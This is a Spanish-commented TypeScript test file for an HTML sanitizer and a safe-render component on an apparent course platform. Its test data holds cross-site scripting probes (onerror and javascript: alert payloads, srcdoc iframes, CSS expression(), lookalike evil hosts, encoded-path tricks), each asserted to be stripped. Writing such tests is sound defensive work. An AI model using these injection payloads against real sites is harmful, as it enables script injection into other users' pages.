    'https://evil.example/a.png': null,
    'http://hola-mako.com/a.png': null,
    'data:image/png;base64,AAAA': null,
    [`mako-adjunto:${U.slice(0, -1)}`]: null,
    // De nuestro origen, sólo un ARCHIVO de imagen estático: ninguna ruta que haga algo.
    'https://hola-mako.com/cono-ugc/curso/tapa.webp': 'https://hola-mako.com/cono-ugc/curso/tapa.webp',
    'https://hola-mako.com/api/compartido/curso/entrar?t=abc': null,
    'https://hola-mako.com/api/x.png': null,
    'https://hola-mako.com/API/x.png': null,
    'https://hola-mako.com/%61pi/x.png': null,
    'https://hola-mako.com//api/x.png': null,
    'https://hola-mako.com/_next/image?url=x': null,
    'https://hola-mako.com/a.png?v=1': null,
    'https://hola-mako.com/a.png#x': null,
    'https://hola-mako.com/crm': null,
    'https://hola-mako.com/a.svg': null,
  });
});

// ── Lo que sí pasa ───────────────────────────────────────────────────────────

test('lo que escribe el editor (y lo que se pega de Word o Docs) sale exacto', { timeout: 180_000 }, () => {
  const s = correr();
  PASAN.forEach(([entra, sale], i) => assert.equal(s.pasan[i], sale, `«${entra}»`));
});

test('el saneo es IDEMPOTENTE: pasarlo dos veces no cambia nada', { timeout: 180_000 }, () => {
  const s = correr();
  const todos = [...ATAQUES, ...PASAN.map(([h]) => h)];
  const malos = s.idem.map((ok, i) => (ok ? null : todos[i])).filter(Boolean);
  assert.deepEqual(malos, []);
});

test('un cuerpo gigante no tira: se corta antes de parsear y sale saneado', { timeout: 180_000 }, () => {
  const s = correr();
  assert.ok(s.gigante.ok);
  assert.ok(s.gigante.largo > 0 && s.gigante.largo < 1_000_000);
});

// ── El texto plano y el camino de guardar ────────────────────────────────────

test('textoDeHtml: párrafos, listas (con sangría y número), tareas, el nombre de un archivo, sin imágenes', { timeout: 180_000 }, () => {
  const s = correr();
  assert.equal(s.texto.completo, [
    'Título', '', 'Hola & chau', '', '• uno', '• dos', '  • sub', '', '3. a', '4. b', '', '[x] hecho', '[ ] falta', '',
    'Fin', 'línea', '', 'Ver Precios.pdf', '', 'cita',
  ].join('\n'));
  assert.equal(s.texto.ataque, 'ab', 'el texto plano sale del HTML ya saneado: un script no deja su código');
  assert.equal(s.texto.vacio, '');
  // Una tabla: un renglón por fila, las celdas separadas por « | », lo de una celda en un renglón.
  assert.equal(s.texto.tabla, ['Antes', '', 'Plan | Precio', 'Base y más | US$10 al mes', '', 'Después'].join('\n'));
});

// ── El tamaño de una imagen y las tablas (08/10/2026, item 10) ───────────────

test('imagen y tabla: los ataques salen exactos (sin lo que no está en la lista)', { timeout: 180_000 }, () => {
  const s = correr();
  const sale = (h: string) => s.sanear[ATAQUES.indexOf(h)];
  const sola = `<img src="mako-adjunto:${U}" alt="" />`;
  assert.equal(sale(`<img src="mako-adjunto:${U}" data-ancho="50;position:fixed">`), sola);
  assert.equal(sale(`<img src="mako-adjunto:${U}" data-ancho="expression(alert(1))">`), sola);
  assert.equal(sale(`<img src="mako-adjunto:${U}" data-ancho="050">`), sola, '«050» no es «50»: lo que entra es lo que sale, o no entra');
  assert.equal(sale(`<img src="mako-adjunto:${U}" data-ancho="500" data-alinea="javascript:alert(1)">`), sola);
  assert.equal(sale(`<img src="mako-adjunto:${U}" data-ancho="33" style="width:50%;position:fixed;top:0" data-alinea="centro " onload="alert(1)">`), sola,
    '33 no está en la lista (de a 5), una imagen no lleva style, y «centro » con un espacio no es «centro»');
  assert.equal(sale(ATAQUES.find((a) => a.startsWith('<table style="position:fixed'))!), '<table><tr><td style="text-align:right">a</td></tr></table>');
  assert.equal(sale(ATAQUES.find((a) => a.startsWith('<table><caption>'))!),
    '<table>c<thead><tr><th>a</th><th>b</th><th>c</th><th>d</th><th>e</th><th>f</th></tr></thead></table>',
    'un colspan de 0, negativo, en notación científica, con un espacio, de más de 20 o con un cero adelante no es un colspan');
  assert.equal(sale(ATAQUES.find((a) => a.startsWith('<table><tbody><tr><td><iframe'))!), '<table><tbody><tr><td>x</td></tr></tbody></table>');
  assert.equal(sale(ATAQUES.find((a) => a.startsWith('<table><tr><td style="text-align:center;'))!), '<table><tr><td style="text-align:center">z</td><th>w</th></tr></table>');
});

test('anchoDeImagen y alineaDeImagen: la lista, como texto exacto (la primera capa, sola)', () => {
  assert.deepEqual(ANCHOS_IMAGEN, [10, 15, 20, 25, 30, 35, 40, 45, 50, 55, 60, 65, 70, 75, 80, 85, 90, 95, 100]);
  for (const n of ANCHOS_IMAGEN) { assert.equal(anchoDeImagen(String(n)), n); assert.equal(anchoDeImagen(n), n); }
  for (const malo of ['050', '5', '0', '105', '110', '33', '50px', '50%', ' 50', '50 ', '5e1', '50.0', '-50', '', null, undefined, {}, 50.5, Number.NaN]) {
    assert.equal(anchoDeImagen(malo), null, `«${String(malo)}» pasó como ancho`);
  }
  assert.equal(alineaDeImagen('centro'), 'centro');
  for (const malo of ['izquierda', 'derecha', 'Centro', 'centro ', 'center', '', null]) assert.equal(alineaDeImagen(malo), null);
});

test('la tabla se dibuja adentro de una caja que scrollea; el texto que dice «<table» no se toca', () => {
  assert.equal(envolverTablas('<p>a</p>'), '<p>a</p>');
  assert.equal(envolverTablas('<table><tr><td>1</td></tr></table><p>x</p><table><tr><td><table><tr><td>2</td></tr></table></td></tr></table>'),
    '<div class="mk-rico-tabla"><table><tr><td>1</td></tr></table></div><p>x</p><div class="mk-rico-tabla"><table><tr><td><div class="mk-rico-tabla"><table><tr><td>2</td></tr></table></div></td></tr></table></div>');
  assert.equal(envolverTablas('<p>&lt;table&gt; es una etiqueta</p>'), '<p>&lt;table&gt; es una etiqueta</p>');
  // Y el COMPONENTE la envuelve (las funciones pueden estar bien y el componente no llamarlas).
  const html = renderToStaticMarkup(createElement(HtmlSeguro, { html: '<table><tbody><tr><td><p>1</p></td></tr></tbody></table>', urlDeAdjunto: () => null }));
  assert.match(html, /<div class="mk-rico"><div class="mk-rico-tabla"><table><tbody><tr><td><p>1<\/p><\/td><\/tr><\/tbody><\/table><\/div><\/div>/);
});

test('la hoja de lectura: un ancho por valor de la lista, el centrado, la tabla, y la LETRA del curso', () => {
  for (const n of ANCHOS_IMAGEN) assert.ok(CSS_RICO.includes(`.mk-rico img[data-ancho="${n}"] { width: ${n}%; }`), `falta el ancho ${n}`);
  assert.match(CSS_RICO, /\.mk-rico img\[data-alinea="centro"\] \{ margin-left: auto; margin-right: auto; \}/);
  assert.match(CSS_RICO, /\.mk-rico \.mk-rico-tabla, \.mk-rico \.tableWrapper \{[^}]*overflow-x: auto/);
  assert.match(CSS_RICO, /\.mk-rico th, \.mk-rico td \{[^}]*border: 1px solid/);
  // Item 3: la letra del texto rico es la del curso (o la de donde se monte), nunca una propia.
  assert.match(CSS_RICO, /\.mk-rico \{ font-family: var\(--ugc-fuente, inherit\);/);
  const familias = [...CSS_RICO.matchAll(/([^{}]+)\{[^}]*font-family:[^;}]*/g)].map((m) => m[1].trim());
  assert.deepEqual(familias, ['.mk-rico', '.mk-rico code'], 'otra regla con su propia letra le gana a la del curso');
});

test('validarHtmlRico: vacío vale, otra cosa que texto no, y pasarse se RECHAZA (no se corta)', { timeout: 180_000 }, () => {
  const s = correr();
  assert.deepEqual(s.validar.vacio, { ok: true, html: '', texto: '' });
  assert.deepEqual(s.validar.nulo, { ok: true, html: '', texto: '' });
  assert.equal(s.validar.numero.ok, false);
  assert.deepEqual(s.validar.largo, { ok: false, error: 'La descripción es demasiado larga.' });
  assert.deepEqual(s.validar.bien, { ok: true, html: '<p>Hola <strong>che</strong></p>', texto: 'Hola che' });
});

// ── Lo insertado (08/10/2026, item 15 del audio) ─────────────────────────────

test('lo insertado: un iframe de la lista sale con SUS atributos fijos; uno que no es de la lista no deja nada', { timeout: 180_000 }, () => {
  const s = correr();
  // Los ataques de iframe quedan en NADA: ni la etiqueta ni lo de adentro.
  const desde = ATAQUES.indexOf('<iframe src="https://calendly.com.evil.tld/juan/30min"></iframe>');
  assert.ok(desde > 0);
  for (let i = desde; i < ATAQUES.length; i++) assert.equal(s.sanear[i], '', `«${ATAQUES[i]}» → «${s.sanear[i]}»`);
  assert.equal(s.sanear[ATAQUES.indexOf('<iframe src="https://evil.example"></iframe>')], '');
  // Una descripción que es SÓLO una agenda tiene texto (la dirección): una tarea así sigue siendo una tarea.
  assert.equal(s.texto.insertado, ['Agenda tu llamada:', '', 'https://calendly.com/juan/30min', '', 'Después'].join('\n'));
  assert.equal(s.texto.soloInsertado, 'https://calendly.com/juan/30min');
  assert.deepEqual(s.validar.agenda, { ok: true, html: CAL_SANEADO(700), texto: 'https://calendly.com/juan/30min' });
});

test('la alarma acepta un iframe SÓLO en la forma exacta del saneo, y el componente lo dibuja', () => {
  assert.equal(pareceSaneado(YT_SANEADO), true);
  assert.equal(pareceSaneado(`<p>a</p>${CAL_SANEADO(900)}<p>b</p>`), true);
  const malos = [
    YT_SANEADO.replace('youtube-nocookie.com', 'youtube-nocookie.com.evil.tld'),
    YT_SANEADO.replace('?rel=0', '?rel=0&autoplay=1'),
    YT_SANEADO.replace('<iframe ', '<iframe srcdoc="x" '),
    // Sin comillas: no es un atributo de la forma del saneo, y un `srcdoc` corre con NUESTRO origen.
    YT_SANEADO.replace('<iframe ', '<iframe srcdoc=x '),
    YT_SANEADO.replace('></iframe>', ' allowfullscreen></iframe>'),
    YT_SANEADO.replace(' allow-presentation', ' allow-presentation allow-top-navigation'),
    YT_SANEADO.replace(/ sandbox="[^"]*"/, ''),
    YT_SANEADO.replace('></iframe>', '>texto</iframe>'),
    YT_SANEADO.replace('</iframe>', ''),
    YT_SANEADO.replace('title="YouTube"', "title='YouTube'"),
    YT_SANEADO.replace('data-proveedor="youtube"', 'data-proveedor="youtube" data-alto="700"'),
    CAL_SANEADO(700).replace('data-alto="700"', 'data-alto="333"'),
    CAL_SANEADO(700).replace('data-proveedor="calendly"', 'data-proveedor="youtube"'),
    '<iframe src="https://evil.tld/"></iframe>',
  ];
  for (const m of malos) assert.equal(pareceSaneado(m), false, m.slice(0, 160));
  assert.equal(iframeCanonico(YT_SANEADO.slice(0, YT_SANEADO.indexOf('>') + 1)), true);
  // El COMPONENTE: lo dibuja (y uno armado a mano no).
  const dibujar = (h: string) => renderToStaticMarkup(createElement(HtmlSeguro, { html: h, urlDeAdjunto: () => null }));
  assert.match(dibujar(`<p>Hola</p>${CAL_SANEADO(700)}`), /<iframe src="https:\/\/calendly\.com\/juan\/30min" title="Calendly" data-proveedor="calendly" data-alto="700" sandbox="allow-scripts/);
  const err = console.error;
  console.error = () => {};
  try { assert.doesNotMatch(dibujar(malos[0]), /<iframe/); } finally { console.error = err; }
});

test('la hoja de lectura: un video a 16:9 y al ancho del texto, una agenda a su alto (un valor por regla)', () => {
  assert.match(CSS_RICO, /\.mk-rico iframe \{[^}]*width: 100%;[^}]*height: auto;[^}]*aspect-ratio: 16 \/ 9;/);
  assert.match(CSS_RICO, /\.mk-rico iframe\[data-alto\] \{ aspect-ratio: auto;/);
  for (const n of ALTOS_EMBED) assert.ok(CSS_RICO.includes(`.mk-rico iframe[data-alto="${n}"] { height: ${n}px; }`), `falta el alto ${n}`);
});

// ── HtmlSeguro: la referencia, la alarma y la traducción ─────────────────────

test('la referencia: exacta, en minúsculas, y sólo la de un atributo', () => {
  assert.equal(idDeRef(`mako-adjunto:${U}`), U);
  assert.equal(idDeRef(`mako-adjunto:${U.toUpperCase()}`), null);
  assert.equal(idDeRef(`mako-adjunto:${U} `), null);
  assert.equal(idDeRef(` mako-adjunto:${U}`), null);
  assert.equal(idDeRef(42), null);
  assert.equal(refDeId(U), `mako-adjunto:${U}`);
  assert.equal(refDeId('nope'), null);
  const html = `<p>texto mako-adjunto:${U2} suelto</p><img src="mako-adjunto:${U}" alt="" /><a href="mako-adjunto:${U2}" class="mk-adjunto">a</a><img src="mako-adjunto:${U}" alt="" />`;
  assert.deepEqual(refsEnHtml(html), [U, U2], 'en orden, sin repetir, y la del texto suelto no cuenta… salvo que esté en un atributo');
  assert.deepEqual(refsEnHtml(`<p>mako-adjunto:${U}</p>`), []);
  assert.deepEqual(refsEnHtml(null), []);
});

test('la alarma: no dibuja lo que no salió del saneo, y no se asusta del TEXTO', () => {
  assert.equal(pareceSaneado('<p>Usa onclick= en tu botón y escribe javascript: si quieres</p>'), true);
  assert.equal(pareceSaneado('<p><a href="https://x.co" title="ve online=sí">x</a></p>'), true, 'un valor no es un manejador');
  assert.equal(pareceSaneado('<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>'), true);
  assert.equal(pareceSaneado('<img src="x" onerror="alert(1)" />'), false);
  assert.equal(pareceSaneado('<a href="javascript:alert(1)">x</a>'), false);
  assert.equal(pareceSaneado('<a href=" JavaScript:alert(1)">x</a>'), false);
  assert.equal(pareceSaneado('<svg><a>x</a></svg>'), false);
  assert.equal(pareceSaneado('<p>x</p><!-- y -->'), false);
});

test('la traducción: la URL de quien mira, escapada; lo que no se resuelve no queda roto', () => {
  const html = `<p>A</p><img src="mako-adjunto:${U}" alt="f" /><p><a href="mako-adjunto:${U2}" class="mk-adjunto" target="_blank" rel="noopener noreferrer nofollow">P.pdf</a> <a href="https://ok.co/" target="_blank" rel="noopener noreferrer nofollow">ok</a></p>`;
  const urls: Record<string, string> = {
    [`mako-adjunto:${U}`]: '/api/compartido/curso/adjunto?t=abc&c=3&a=' + U,
    [`mako-adjunto:${U2}`]: 'https://s.co/x?token=a&download=P.pdf',
  };
  const out = traducirAdjuntos(html, (r) => urls[r]);
  assert.match(out, new RegExp(`<img src="/api/compartido/curso/adjunto\\?t=abc&amp;c=3&amp;a=${U}" alt="f" />`));
  assert.match(out, /<a href="https:\/\/s\.co\/x\?token=a&amp;download=P\.pdf" class="mk-adjunto"/, 'la URL va escapada adentro del atributo');
  assert.match(out, /<a href="https:\/\/ok\.co\/"/, 'un link normal no se toca');
  // Una URL con una comilla no es dibujable: cerraría el atributo.
  assert.doesNotMatch(traducirAdjuntos(html, () => 'https://s.co/x?a="b'), /s\.co/);
  // Sin URL: la imagen se va y el chip queda sin destino (el nombre se sigue leyendo).
  const sin = traducirAdjuntos(html, () => null);
  assert.doesNotMatch(sin, /<img/);
  assert.match(sin, /<a class="mk-adjunto" target="_blank" rel="noopener noreferrer nofollow">P\.pdf<\/a>/);
  // Una función que devuelve algo que no es una URL dibujable NO lo mete en el atributo.
  const mala = traducirAdjuntos(html, () => 'javascript:alert(1)');
  assert.doesNotMatch(mala, /javascript/i);
  assert.doesNotMatch(traducirAdjuntos(html, () => '//evil.example/x'), /evil/);
  // Y una función que TIRA no tumba la pantalla.
  assert.doesNotMatch(traducirAdjuntos(html, () => { throw new Error('x'); }), /<img/);
  assert.equal(urlDibujable('blob:https://hola-mako.com/123'), true);
  assert.equal(urlDibujable('/\\evil.example'), false);
  // Un signo de pesos en la URL es un carácter, no una sustitución del `replace`: con la cadena de
  // reemplazo, «$&» metía el atributo viejo adentro del nuevo y «$$» se comía un pesos.
  const pesos = traducirAdjuntos(html, (r) => (r.endsWith(U2) ? 'https://s.co/x?n=US$$1$&b' : null));
  assert.match(pesos, /<a href="https:\/\/s\.co\/x\?n=US\$\$1\$&amp;b" class="mk-adjunto"/);
  assert.doesNotMatch(pesos, /mako-adjunto:/);
});

test('el COMPONENTE usa la alarma y la traducción, no sólo las funciones sueltas', () => {
  // Las funciones de arriba pueden estar perfectas y el componente no llamarlas: lo que se prueba
  // acá es lo que DIBUJA `<HtmlSeguro>`.
  const dibujar = (h: string, url: (ref: string) => string | null) =>
    renderToStaticMarkup(createElement(HtmlSeguro, { html: h, urlDeAdjunto: url, vacio: createElement('i', null, 'vacío') }));
  // (El componente avisa en la consola cuando se niega: acá se calla, es el caso esperado.)
  const err = console.error;
  console.error = () => {};
  const malo = (() => { try { return dibujar('<p>x</p><img src="x" onerror="alert(1)" />', () => null); } finally { console.error = err; } })();
  assert.doesNotMatch(malo, /onerror|<img/, 'un HTML que no salió del saneo se dibujó igual');
  assert.match(malo, /<i>vacío<\/i>/);
  const bueno = dibujar(`<p>Hola</p><img src="mako-adjunto:${U}" alt="f" />`, (r) => `/api/compartido/curso/adjunto?t=abc&a=${idDeRef(r)}`);
  assert.match(bueno, new RegExp(`<img src="/api/compartido/curso/adjunto\\?t=abc&amp;a=${U}" alt="f" />`));
  assert.doesNotMatch(bueno, /mako-adjunto:/, 'la referencia llegó al navegador sin traducir');
});
